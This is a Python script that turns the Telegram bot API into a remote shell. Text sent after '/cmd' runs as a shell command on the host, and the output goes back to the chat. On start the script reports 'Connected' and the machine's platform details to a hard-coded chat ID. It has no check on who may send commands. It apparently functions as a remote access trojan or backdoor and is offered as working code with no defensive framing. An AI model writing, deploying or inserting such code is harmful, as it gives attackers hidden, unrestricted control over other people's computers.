import telebot
import subprocess
import platform

TOKEN = ""
CHAT_ID = 
bot = telebot.TeleBot(TOKEN)

def decode_output(b: bytes) -> str:
    for enc in ("utf-8", "cp866", "cp1251"):
        try:
            return b.decode(enc)
        except Exception:
            pass
    return b.decode("utf-8", errors="replace")

def send_long(chat_id, text):
    chunk_size = 4000
    for i in range(0, len(text), chunk_size):
        bot.send_message(chat_id, f"```\n{text[i:i+chunk_size]}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['cmd'])
def run_cmd(message):
    cmd = message.text.replace("/cmd ", "", 1).strip()
    if not cmd:
        bot.reply_to(message, "Enter command after /cmd")
        return

    try:
        completed = subprocess.run(cmd, shell=True, capture_output=True)
        out_bytes = completed.stdout or completed.stderr or b""
        output = decode_output(out_bytes)
    except Exception as e:
        output = f"Error: {e}"

    if not output:
        output = "No output."
    send_long(message.chat.id, output)

def notify_start():
    try:
        info = platform.platform()
        bot.send_message(CHAT_ID, f"✅ Connected.\nPC: {info}")
    except Exception as e:
        print(f"Error notifi: {e}")

print("Bot started...")
notify_start()
bot.polling()
